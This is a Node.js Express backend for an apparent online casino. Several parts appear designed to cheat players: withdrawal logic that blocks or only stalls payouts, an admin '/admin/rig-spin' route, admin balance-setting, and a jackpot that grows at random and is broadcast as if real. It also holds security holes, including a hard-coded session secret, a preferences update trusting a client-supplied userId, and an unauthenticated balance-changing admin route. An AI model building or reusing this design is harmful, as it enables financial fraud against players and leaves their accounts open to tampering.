const express = require('express');
const session = require('express-session');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const i18n = require('i18n');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const db = new sqlite3.Database('./database.db');

// Session middleware
app.use(session({
    secret: 'your-secret-key',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false, maxAge: 1000 * 60 * 60 } // 1 hour
}));

// Static files and body parsing
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Internationalization (Multi-Language Support)
i18n.configure({
    locales: ['en', 'es', 'fr'], // Add more languages as needed
    directory: path.join(__dirname, 'locales'),
    defaultLocale: 'en'
});
app.use(i18n.init);

// ---- USER ROUTES ----
app.post('/register', (req, res) => { /* Registration logic */ });
app.post('/login', (req, res) => { /* Login logic */ });
app.get('/logout', (req, res) => { /* Logout logic */ });
app.get('/get-balance', (req, res) => { /* Fetch user balance */ });
app.post('/deposit', (req, res) => { /* Deposit logic */ });
app.post('/withdraw-request', (req, res) => {
    /* Withdrawal blocking logic */
    const { bonusPending, balance } = req.session.user || {};
    if (bonusPending || balance < 200) {
        return res.json({ success: false, message: res.__('Cannot withdraw yet.') });
    }
    res.json({ success: true, message: res.__('Processing... please wait 3-5 business days') });
});
app.route('/daily-spin')
    .get((req, res) => { /* Get daily spin status */ })
    .post((req, res) => { /* Handle daily spin */ });
app.post('/claim-bonus', (req, res) => { /* Bonus claim logic */ });

// ---- ADMIN ROUTES ----
app.get('/admin', (req, res) => { /* Serve admin panel */ });
app.post('/admin/login', (req, res) => { /* Admin login */ });
app.get('/admin/users', (req, res) => { /* Fetch all users */ });
app.post('/admin/set-balance', (req, res) => { /* Set user balance */ });
app.get('/admin/view-withdrawals', (req, res) => { /* View withdrawal requests */ });
app.post('/admin/approve-withdraw', (req, res) => { /* Approve withdrawal */ });
app.post('/admin/rig-spin', (req, res) => { /* Rig spin logic */ });

// ---- USER PREFERENCES ----
app.post('/preferences', (req, res) => {
    const { userId, preferences } = req.body;
    const { notifications, timeZone, gameSettings } = preferences;

    db.run(
        `UPDATE users SET notifications = ?, timeZone = ?, gameSettings = ? WHERE id = ?`,
        [notifications, timeZone, JSON.stringify(gameSettings), userId],
        function (err) {
            if (err) return res.status(500).json({ success: false, message: res.__('Error saving preferences') });
            res.json({ success: true, message: res.__('Preferences saved successfully') });
        }
    );
});

// ---- FRAUD DETECTION ----
app.get('/fraud-alerts', (req, res) => {
    db.all(`SELECT * FROM fraud_flags`, [], (err, rows) => {
        if (err) return res.status(500).json({ success: false, message: res.__('Error fetching fraud alerts') });
        res.json({ success: true, data: rows });
    });
});

// ---- SOCKET.IO REAL-TIME FEATURES ----
let jackpot = 1000; // Example starting jackpot
setInterval(() => {
    jackpot += Math.floor(Math.random() * 10);
    io.emit('jackpot-update', { jackpot });
}, 10000); // Increment jackpot randomly every 10s

app.post('/admin/manual-update', (req, res) => {
    const { type, userId, amount } = req.body;
    if (type === 'deposit') {
        db.run(`UPDATE users SET balance = balance + ? WHERE id = ?`, [amount, userId], (err) => {
            if (err) return res.status(500).json({ success: false, message: res.__('Error updating deposit') });
            io.emit('live-update', { type: 'deposit', userId, amount });
            res.json({ success: true, message: res.__('Deposit updated successfully') });
        });
    } else if (type === 'withdraw') {
        db.run(`UPDATE users SET balance = balance - ? WHERE id = ?`, [amount, userId], (err) => {
            if (err) return res.status(500).json({ success: false, message: res.__('Error updating withdrawal') });
            io.emit('live-update', { type: 'withdraw', userId, amount });
            res.json({ success: true, message: res.__('Withdrawal updated successfully') });
        });
    } else {
        res.status(400).json({ success: false, message: res.__('Invalid update type') });
    }
});
// Fallback route to serve index.html (homepage)
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

// ---- SERVER LISTEN ----
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));